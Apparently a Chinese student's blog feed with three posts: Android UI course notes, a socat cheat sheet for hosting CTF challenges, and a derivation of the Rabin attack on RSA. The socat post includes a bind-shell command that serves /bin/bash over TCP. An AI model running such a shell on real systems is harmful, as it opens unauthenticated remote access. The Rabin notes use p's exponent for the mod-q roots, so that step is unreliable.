<p>哦，身高体重的<code>EditText</code>的<code>id</code>写反了，这个出了问题debug还不是很直观？</p>
<h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><h4 id="变量域"><a href="#变量域" class="headerlink" title="变量域"></a>变量域</h4><p>还在恶补Java，自行体会，被卡住过</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211010131515665.png" alt="image-20211010131515665"></p>
<h4 id="单选按钮怎么清空"><a href="#单选按钮怎么清空" class="headerlink" title="单选按钮怎么清空"></a>单选按钮怎么清空</h4><p>获取单选按钮组，然后</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">RadioGroup sex_RadioGroup = findViewById(R.id.sex_RadioGroup);</span><br><span class="line"></span><br><span class="line">sex_RadioGroup.setOnCheckedChangeListener(<span class="keyword">null</span>);</span><br><span class="line">sex_RadioGroup.clearCheck();</span><br><span class="line">sex_RadioGroup.setOnCheckedChangeListener(<span class="keyword">new</span> RadioGroup.OnCheckedChangeListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCheckedChanged</span><span class="params">(RadioGroup radioGroup, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>要有第3, 5行代码的，不然程序直接崩溃</p>
<h2 id="Task2-ListView"><a href="#Task2-ListView" class="headerlink" title="Task2 ListView"></a>Task2 ListView</h2><p>主要是怎么添加项</p>
<p>和下拉框很像</p>
<p>一种是在layout中里添加</p>
<p>首先这个选项的具体数据是存在<code>res/values/strings.xml</code>中，添加</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">string-array</span> <span class="attr">name</span>=<span class="string">&quot;items&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span>&gt;</span>Item1<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span>&gt;</span>Item2<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span>&gt;</span>Item3<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span>&gt;</span>Item4<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">string-array</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后将<code>ListView</code>的<code>entries</code>属性值改为<code>@array/items</code></p>
<p>还有一种是动态添加的</p>
<p>再后来就是获取选中哪个item的勾当</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* listview: response which item chosen */</span></span><br><span class="line">items_listview.setOnItemClickListener(<span class="keyword">new</span> AdapterView.OnItemClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onItemClick</span><span class="params">(AdapterView&lt;?&gt; adapterView, View view, <span class="keyword">int</span> i, <span class="keyword">long</span> l)</span> </span>&#123;</span><br><span class="line">        String[] item = getResources().getStringArray(R.array.items);</span><br><span class="line">        Toast.makeText(MainActivity2.<span class="keyword">this</span>, item[i], Toast.LENGTH_LONG).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="遇到的问题-1"><a href="#遇到的问题-1" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><h4 id="多页面开发"><a href="#多页面开发" class="headerlink" title="多页面开发"></a>多页面开发</h4><p>主要是不想重新建一个项目，方便查看，ez</p>
<p>需要知道一个界面就是一个<code>activity</code></p>
<p>所以要先新建一个<code>Empty activity</code>，命名默认是<code>MainActivity2</code></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211010162241148.png" alt="image-20211010162241148"></p>
<p>然后<code>AndroidManifest</code>中会自动帮你注册好</p>
<p>用<code>Intent</code>来实现跳转，在两个<code>Activity</code>的java代码中分别添加（当然xml里先有各自跳转的按钮）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* next page buuton: go to MainActivity2 */</span></span><br><span class="line">nextPage_button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent(MainActivity.<span class="keyword">this</span>, MainActivity2.class);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* last page button: go back to MainActivity1 */</span></span><br><span class="line">lastPage_button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent(MainActivity2.<span class="keyword">this</span>, MainActivity.class);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>更多的<code>Intent</code>使用可以查</p>
<h2 id="Task3-Spinner"><a href="#Task3-Spinner" class="headerlink" title="Task3 Spinner"></a>Task3 Spinner</h2><p>也就是下拉框</p>
<p>用getSelectedItem方法获取当前下拉框选中的值</p>
<p>并用setSelection方法设置当前下拉框选中的值</p>
<p>一个下拉框没什么，和简单的ListView类似，问题是多级联动的下拉框怎么搞</p>
<p><em>看到网上有很多是直接写在java里，写不死你（当然只写一两个的请绕过）；我觉得最优雅的方式应该是类似json下有很多层吧，但是网上没有搜到，不太行。亿点气，明明很多软件都有这个功能了，但浅搜索到的都是什么垃圾玩意，各种抄，抄还抄不好</em></p>
<h3 id="适配器"><a href="#适配器" class="headerlink" title="适配器"></a>适配器</h3><p>适配器是什么</p>
<p>图省力，我直接用网上代码里的省城区了，emmmm就差不多是抄代码了，<a href="https://www.cnblogs.com/zjjne/p/3350107.html">这份代码</a>被抄烂了，我也插一手</p>
<p>是一种设计模式吧，我的理解是，输入有很多，但输出只有一种</p>
<p>比如这里的我们本来只有省份、城市和区的数组，但是需要将这个体现在<code>Spinner</code>中，本来是直接传入<code>strings.xml</code>中的<code>item</code>；而现在传入的是一个数组，两者有类似的地方，但显然不同。所以适配器的实现者就是为我们做了一个接口，使得数组里面的数据，在我们看来可以很快地传入<code>Spinner</code>中</p>
<p>这里一般就是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化一个适配器</span></span><br><span class="line">ArrayAdapter&lt;String&gt; province_adapter = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为适配器绑定值</span></span><br><span class="line">province_adapter = <span class="keyword">new</span> ArrayAdapter&lt;String&gt;(MainActivity2.<span class="keyword">this</span>,</span><br><span class="line">                android.R.layout.simple_spinner_item, province);</span><br><span class="line">province_spinner.setAdapter(province_adapter);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当需要的时候为适配器赋予新值，并在此绑定</span></span><br><span class="line">city_adapter = <span class="keyword">new</span> ArrayAdapter&lt;String&gt;(MainActivity2.<span class="keyword">this</span>,</span><br><span class="line">                                        android.R.layout.simple_spinner_item, city[i]);</span><br><span class="line">city_spinner.setAdapter(city_adapter);</span><br></pre></td></tr></table></figure>

<p>更多的可以直接看我传在github的源码</p>
<hr>
<p>这种方式xml布局里就是三个下拉框</p>
<h3 id="json"><a href="#json" class="headerlink" title="json"></a>json</h3><p>参考<a href="https://www.jianshu.com/p/253942a1350a">这篇文章</a></p>
<p>先创个assets文件夹，里面放存有省份、城市、区块的json文件，这个github就有，搜<code>Android省市区三级联动</code>就有</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211011135627210.png" alt="image-20211011135627210"></p>
<p>然后差不多抄代码吧，看不懂</p>
<p>要添加一个gson的依赖，忘了，上课时间零零散散的，记的时候没想起来，但是网上都能搜到</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211011235645263.png" alt="image-20211011235645263"></p>
<p>如果遇到问题可以试试<code>AVD Manager</code>-&gt;<code>Wipe Data</code></p>
<p>然后就是回归下人类的本质，最后结果也出来了</p>
<h3 id="遇到的问题-2"><a href="#遇到的问题-2" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><h4 id="ScrollView和约束型布局"><a href="#ScrollView和约束型布局" class="headerlink" title="ScrollView和约束型布局"></a>ScrollView和约束型布局</h4><p>放不下了，所以用了滑动标签ScrollView搭配约束性布局</p>
<p>除了常规的属性外，还需要配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">android:fillViewport=&quot;true&quot;</span><br></pre></td></tr></table></figure>

<p>然后再拉设计视图的</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211011091703226.png" alt="image-20211011091703226"></p>
<p>就可以无限拍拖</p>
<p>设计视图看可以，但实际不行，emmmmm搜了下没有解决，应该换成线性布局就好了吧</p>
<h2 id="Task4-ToggleButton"><a href="#Task4-ToggleButton" class="headerlink" title="Task4 ToggleButton"></a>Task4 ToggleButton</h2><p>状态开关按钮，继承于Button</p>
<p>要实现开关按钮控制图片的效果，需要ToggleButton和ImageView配合使用</p>
<p>先导入要用到的图片</p>
<p>添加响应事件，通过三目运算符简化代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* toggle button: light on &amp; off */</span></span><br><span class="line">light_toggleButton.setOnCheckedChangeListener(<span class="keyword">new</span> CompoundButton.OnCheckedChangeListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCheckedChanged</span><span class="params">(CompoundButton compoundButton, <span class="keyword">boolean</span> isChecked)</span> </span>&#123;</span><br><span class="line">        light_toggleButton.setChecked(isChecked);</span><br><span class="line">        light_imageView.setImageResource(isChecked?R.drawable.on:R.drawable.off);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="遇到的问题-3"><a href="#遇到的问题-3" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><h4 id="导入图片"><a href="#导入图片" class="headerlink" title="导入图片"></a>导入图片</h4><p>APP的icon放在minmap下，其他图片放在drawable下</p>
<p>drawable要手动创建不同尺寸的文件夹，下面操作</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211010201941864.png" alt="image-20211010201941864"></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211010202226698.png" alt="image-20211010202226698"></p>
<p>选择对应尺寸大小的文件，具体大小可以上网搜</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211010202410843.png" alt="image-20211010202410843"></p>
<p>用约束型布局添加ImageView会看到你放在drawable-XXX文件夹下的文件，方便</p>
<h2 id="Task5-按钮状态选择"><a href="#Task5-按钮状态选择" class="headerlink" title="Task5 按钮状态选择"></a>Task5 按钮状态选择</h2><p>设置按钮的background属性为定义了按钮状态的xml文件，实现按钮在不同状态（未按下和按下）下的显示效果</p>
<p>好像有点会错意了，不过问题不大，照着下、表格改一下就是另外一种效果</p>
<table>
<thead>
<tr>
<th><strong>状态</strong></th>
<th><strong>取值</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>android:state_pressed</td>
<td>True/false</td>
<td>是否按下，如一个按钮触摸或者点击</td>
</tr>
<tr>
<td>android:state_focused</td>
<td>True/false</td>
<td>是否取得焦点，比如用户选择了一个文本框</td>
</tr>
<tr>
<td>android:state_hovered</td>
<td>True/false</td>
<td>光标是否悬停，通常与focused state相同</td>
</tr>
<tr>
<td>android:state_selected</td>
<td>True/false</td>
<td>被选中的状态</td>
</tr>
<tr>
<td>android:state_checkable</td>
<td>True/false</td>
<td>组件是否能被check。如：RadioButton是可以被check的</td>
</tr>
<tr>
<td>android:state_checked</td>
<td>True/false</td>
<td>组件被选中</td>
</tr>
<tr>
<td>android:state_enabled</td>
<td>True/false</td>
<td>能够接受触摸或者点击事件</td>
</tr>
<tr>
<td>android:state_activated</td>
<td>True/false</td>
<td>被激活</td>
</tr>
<tr>
<td>android:state_window_focused</td>
<td>True/false</td>
<td>应用程序是否在前台，当有通知栏被拉下来或者一个对话框弹出的时候应用程序就不在前台了</td>
</tr>
</tbody></table>
<p>主要的流程是</p>
<p>先在<code>drawable</code>中创建一个<code>btnselector.xml</code></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211011001948254.png" alt="image-20211011001948254"></p>
<p>然后在布局中搞一个button，在code模式下设置其<code>background</code>属性</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">android:background=&quot;@drawable/btnselector&quot;</span><br></pre></td></tr></table></figure>

<p>指向我们的xml文件，<code>btnselector.xml</code>的文件内容如下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">selector</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span> <span class="attr">android:state_pressed</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:drawable</span>=<span class="string">&quot;@drawable/btton_off&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span> <span class="attr">android:state_pressed</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:drawable</span>=<span class="string">&quot;@drawable/btton_on&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">selector</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样实现的是点击一下按钮从on变成off，放手又变回原来的了，不知道怎么实现点一下变on再点一下变off的，用ToggleButton可以</p>
<h3 id="遇到的问题-4"><a href="#遇到的问题-4" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><h4 id="INSTALL-PARSE-FAILED-MANIFEST-MALFORMED"><a href="#INSTALL-PARSE-FAILED-MANIFEST-MALFORMED" class="headerlink" title="INSTALL_PARSE_FAILED_MANIFEST_MALFORMED"></a>INSTALL_PARSE_FAILED_MANIFEST_MALFORMED</h4><p>不要随便新建xml，踩坑了，一开始想新建xml，点成xml下的选项了，在res的xml文件夹下创建一个xml文件</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211011002014707.png" alt="image-20211011002014707"></p>
<p>然后发现错了就把这个文件夹删了，结果报错</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Installation did not succeed.</span><br><span class="line">The application could not be installed: INSTALL_PARSE_FAILED_MANIFEST_MALFORMED</span><br></pre></td></tr></table></figure>

<p>发现<code>AndroidManifest.xml</code>里多了个<code>&lt;meta-data&gt;</code>和<code>xml</code>的东西，删掉运行正常</p>
<h4 id="Button设置background因为有颜色而无效"><a href="#Button设置background因为有颜色而无效" class="headerlink" title="Button设置background因为有颜色而无效"></a>Button设置background因为有颜色而无效</h4><p>将这两个文件的<code>Theme.MaterialComponents.DayNight.DarkActionBar</code>改成<code>Theme.MaterialComponents.DayNight.DarkActionBar.Bridge</code></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211011002600863.png" alt="image-20211011002600863"></p>
<p>好像之前也遇到过</p>
<h2 id="附加题"><a href="#附加题" class="headerlink" title="附加题"></a>附加题</h2><p>emmmmm，下次一定看完再做</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211010193422707.png" alt="image-20211010193422707"></p>
<p>还好，差点想骂人，还是自己搜不到，那就不能怪谁了</p>
<p>应该是有实现好的</p>
<p>也咕咕咕了，实验室4还没写，第二天要检查作业，还要打比赛</p>
]]></content>
      <categories>
        <category>徐帅的安卓课</category>
      </categories>
  </entry>
  <entry>
    <title>Socat</title>
    <url>/posts/bbcb3fe9/</url>
    <content><![CDATA[<p>Socat是Netcat的升级版，所做的工作就是在2个address指定的描述符间建立一个pipe用于发送和接收数据</p>
<span id="more"></span>

<h1 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h1><p>抄的是<a href="https://www.hi-linux.com/posts/61543.html">这篇文章</a>，除了个别用到的，其他没怎么实现过，没有验证过是否正确</p>
<p>先将最实用的，CTF-Crypto出题一般就是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage: %s [port]&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">port = sys.argv[<span class="number">1</span>]</span><br><span class="line">command = <span class="string">&#x27;socat -d -d tcp-l:&#x27;</span> + port + <span class="string">&#x27;,reuseaddr,fork EXEC:&quot;python -u server.py&quot; &#x27;</span></span><br><span class="line">os.system(command)</span><br></pre></td></tr></table></figure>

<h2 id="基本的操作"><a href="#基本的操作" class="headerlink" title="基本的操作"></a>基本的操作</h2><h3 id="Socat命令语法"><a href="#Socat命令语法" class="headerlink" title="Socat命令语法"></a>Socat命令语法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socat [options] &lt;address&gt; &lt;address&gt;</span><br></pre></td></tr></table></figure>

<p>附加选项用逗号隔开</p>
<p>address常见的取值</p>
<ul>
<li><code>-,STDIN,STDOUT</code>：表示标准输入输出，可以就用一个横杠代替。</li>
<li><code>/var/log/syslog</code>：打开一个文件作为数据流，可以是任意路径。</li>
<li><code>TCP:</code>：建立一个 TCP 连接作为数据流，TCP 也可以替换为 UDP 。</li>
<li><code>TCP-LISTEN</code>：建立 一个 TCP 监听端口，TCP 也可以替换为 UDP。</li>
<li><code>EXEC</code>：执行一个程序作为数据流。</li>
</ul>
<h3 id="常见功能实现"><a href="#常见功能实现" class="headerlink" title="常见功能实现"></a>常见功能实现</h3><h4 id="建立相互一个简单的通信"><a href="#建立相互一个简单的通信" class="headerlink" title="建立相互一个简单的通信"></a>建立相互一个简单的通信</h4><ul>
<li>服务器端：<code>socat -TCP4-LISTEN:4440</code></li>
<li>客户端：<code>socat -TCP4:[ip]:[port]</code></li>
</ul>
<h4 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4><ol>
<li><p><strong>读取文件</strong></p>
<ul>
<li><p>绝对路径</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socat - [absolute address]</span><br></pre></td></tr></table></figure></li>
<li><p>相对路径</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socat - ./[relative address]</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>写入文件</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;INPUT_CONTENT&quot; | socat - [address]</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="网络管理"><a href="#网络管理" class="headerlink" title="网络管理"></a>网络管理</h4><ol>
<li><p><strong>连接远程端口</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socat - TCP:[ip]:[port]</span><br></pre></td></tr></table></figure></li>
<li><p><strong>监听一个新端口</strong></p>
<p>应该是在链接远程端口的基础上，我猜，或者本地？</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:[port] -</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>这个我们用到了，我的理解就是Crypto做nc题目的过程</p>
<ol>
<li><p><strong>转发TCP</strong></p>
<p>监听192.168.1.252网卡的15672端口，并将请求转发至172.17.0.15的15672端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socat  -d -d -lf /var/log/socat.log TCP4-LISTEN:15672,bind=192.168.1.252,reuseaddr,fork TCP4:172.17.0.15:15672</span><br></pre></td></tr></table></figure>

<p>其中，</p>
<ul>
<li><code>-d -d</code>：代表调试信息的输出级别，不懂</li>
<li><code>-lf /var/log/socat.log</code>：指定输出信息的文件保存位置</li>
<li><code> TCP4-LISTEN:[port]</code>：在本地建立一个TCP IPv4协议的监听端口</li>
<li><code>bind=[ip]</code>：指定监听绑定的IP地址，不绑定的话将监听服务器上可用的全部IP</li>
<li><code>reuseaddr </code>：绑定一个本地端口</li>
<li><code> fork TCP4:[ip]:[port]</code>：指定要转发到的服务器 IP 和端口</li>
</ul>
</li>
</ol>
<h4 id="传递文件"><a href="#传递文件" class="headerlink" title="传递文件"></a>传递文件</h4><p>将文件demo.tar.gz使用2000端口从192.168.1.252传到192.168.1.253，文件传输完毕后会自动退出</p>
<p>在192.168.1.252上执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socat -u open:demo.tar.gz tcp-listen:2000,reuseaddr</span><br></pre></td></tr></table></figure>

<p>在192.168.1.253上执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socat -u tcp:192.168.1.252:2000 open:demo.tar.gz,create</span><br></pre></td></tr></table></figure>

<ul>
<li><code>-u</code>：数据传输模式从左到右单向</li>
<li><code>-U</code>：数据传输模式从右到左单向</li>
</ul>
<p>还可以<strong>读写分流</strong></p>
<h4 id="其他功能"><a href="#其他功能" class="headerlink" title="其他功能"></a>其他功能</h4><ul>
<li><p>建立一个正向shell</p>
<p><strong>服务端</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 在服务端 7005 端口建立一个 Shellsocat TCP-LISTEN:7005,fork,reuseaddr EXEC:/bin/bash,pty,stderr或socat TCP-LISTEN:7005,fork,reuseaddr system:bash,pty,stderr</span></span><br></pre></td></tr></table></figure>

<p><strong>客户端</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 连接到服务器的 7005 端口，即可获得一个 Shell。readline 是 GNU 的命令行编辑器，具有历史功能socat readline tcp:127.0.0.1:7005</span></span><br></pre></td></tr></table></figure>

<p><em>不太懂，像但并不完全像</em></p>
</li>
</ul>
<ul>
<li><p><strong>让 Socat 后台运行</strong></p>
<p>这个挺好</p>
<p>在命令行最前面加一个<code>nohup</code>命令</p>
</li>
</ul>
<p>最重要的还是</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nohup socat -d -d tcp-l:[port],reuseaddr,fork EXEC:python -u server.py</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>关于操作的一些问题</category>
        <category>CTF-Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>Rabin攻击</title>
    <url>/posts/ba78595a/</url>
    <content><![CDATA[<p>rsa的rabin攻击是个基本的考点，其背后还是涉及到一些原理</p>
<p>师从这位师傅的博客<a href="https://blog.csdn.net/jcbx_/article/details/101066670">https://blog.csdn.net/jcbx_/article/details/101066670</a>以及大牛Rabin的Square roots modulo a prime论文，从头到尾推导一遍</p>
<span id="more"></span>

<h1 id="Rabin攻击和Square-roots-modulo-a-prime原理"><a href="#Rabin攻击和Square-roots-modulo-a-prime原理" class="headerlink" title="Rabin攻击和Square roots modulo a prime原理"></a>Rabin攻击和Square roots modulo a prime原理</h1><p>需要知道二次剩余，雅可比符号还有欧拉准则</p>
<h2 id="二次剩余定理"><a href="#二次剩余定理" class="headerlink" title="二次剩余定理"></a>二次剩余定理</h2><p>在题目中学习过</p>
<ul>
<li>当存在某个X，$X^2\equiv a\ (mod\ p)$成立，称a是模p的二次剩余，记作$a\in QR$</li>
<li>当对任意的X，$X^2\equiv a\ (mod\ p)$不成立，称a是模p的二次非剩余，记作$a\in NR$</li>
</ul>
<h3 id="雅可比符号"><a href="#雅可比符号" class="headerlink" title="雅可比符号"></a>雅可比符号</h3><p>注意，p是奇质数<br>$$<br>(\frac{a}{p})=\begin{cases}<br> 1 ,&amp;a\in QR \\<br> -1 &amp;a\in NR<br> \end{cases}<br>$$<br>有性质：<br>$$<br>(\frac{a}{p})\cdot(\frac{b}{p})=(\frac{ab}{p})<br>$$</p>
<h2 id="欧拉准则"><a href="#欧拉准则" class="headerlink" title="欧拉准则"></a>欧拉准则</h2><p>$$<br>a^{\frac{p-1}{2}}\equiv (\frac{a}{p})\ mod\ p<br>$$</p>
<p>师傅的博客上有证明，我就不抄了</p>
<p>下面开始推导Rabin</p>
<h2 id="Rabin攻击"><a href="#Rabin攻击" class="headerlink" title="Rabin攻击"></a>Rabin攻击</h2><p>在RSA中已知（p,q,n,c,e=2），且$p\equiv q\equiv 3(mod\ 4)$（后面这个条件必须满足，不然就是另外一种做法了）</p>
<p>由之前写过无数的性质可知，要求$c\equiv m^2(mod\ n)$，相当于求$c\equiv m^2(mod\ p)$</p>
<p>则c是模p的二次剩余，得<br>$$<br>c^{\frac{p-1}{2}}\equiv (\frac{c}{p})\ mod\ p<br>$$<br>又$(\frac{c}{p})=1$，得<br>$$<br>c^{\frac{p-1}{2}}\equiv 1\ (mod\ p)<br>$$<br>代入得$c\equiv m^2(mod\ p)$，得<br>$$<br>m^2\equiv c\cdot c^\frac{p-1}{2}\equiv c^\frac{p+1}{2}(mod\ p)<br>$$</p>
<p>然后直接开方，得<br>$$<br>m_1\equiv c^\frac{p+1}{4}\ (mod\ p)<br>$$<br>$$<br>m_2\equiv (p-c^\frac{p+1}{4})\ mod\ p<br>$$</p>
<hr>
<p>这个开方怎么来的呢，聂嘿，之前看过求<strong>平方根论文</strong>的时候也看到过</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210901103319470.png" alt="image-20210901103319470"></p>
<p>反正就是条结论，开方在模运算下也是成立的，我们这里不过是利用模的性质，加了一个模数依旧是成立的</p>
<hr>
<p>同理，在$c\equiv m^2(mod\ q)$下有<br>$$<br>m_3\equiv c^\frac{p+1}{4}\ (mod\ q)<br>$$<br>$$<br>m_4\equiv (q-c^\frac{p+1}{4})\ mod\ q<br>$$<br>综上，<br>$$<br>\begin{cases}<br>m_1\equiv c^\frac{p+1}{4}\ (mod\ p) &amp; \\<br>m_2\equiv (p-c^\frac{p+1}{4})\ mod\ p &amp; \\<br>m_3\equiv c^\frac{p+1}{4}\ (mod\ q) &amp; \\<br>m_4\equiv (q-c^\frac{p+1}{4})\ mod\ q<br>\end{cases}<br>$$<br><em>显然，因为开根之后又转成正数，这里就假设$c^\frac{p+1}{4}$要么等于它本身，要么等于$(q-c^\frac{p+1}{4})$吧，其中的一些细节暂时没有完全悟。反正一般运算意义下，开出来就两种结果嘛</em></p>
<p>这个时候是要解4个同余方程组，用到我们的老朋友中国剩余定理，分别是<br>$$<br>\begin{align}<br>\begin{cases}<br>m_1\equiv c^\frac{p+1}{4}\ (mod\ p)\\<br>m_3\equiv c^\frac{p+1}{4}\ (mod\ q)<br>\end{cases}<br>\qquad<br>\begin{cases}<br>m_1\equiv c^\frac{p+1}{4}\ (mod\ p)\\<br>m_4\equiv (q-c^\frac{p+1}{4})\ mod\ q<br>\end{cases}<br>\\<br>\begin{cases}<br>m_2\equiv (p-c^\frac{p+1}{4})\ mod\ p\\<br>m_3\equiv c^\frac{p+1}{4}\ (mod\ q)<br>\end{cases}<br>\begin{cases}<br>m_2\equiv (p-c^\frac{p+1}{4})\ mod\ p\\<br>m_4\equiv (q-c^\frac{p+1}{4})\ mod\ q<br>\end{cases}<br>\end{align}<br>$$</p>
<hr>
<p>求解的过程就不再赘述，这里直接记公式</p>
<p>对于同余方程组$\begin{cases}<br>x\equiv a_1\ (mod\ m_1)\\<br>x\equiv a_2\ (mod\ m_2)\\<br>\quad \vdots\\<br>x\equiv a_n\ (mod\ m_n)<br>\end{cases}$</p>
<p>$$<br>x=\sum\limits_{i=1}^na_i\frac{M}{m_i}[(\frac{M}{m_i})^{-1}]_{m_i}\ mod\ M<br>$$</p>
<p>其中$M=\prod\limits_{i=1}^{n}m_i$</p>
<hr>
<p>所以我们看了和la佬博客上那样的脚本，懒狗不想复现</p>
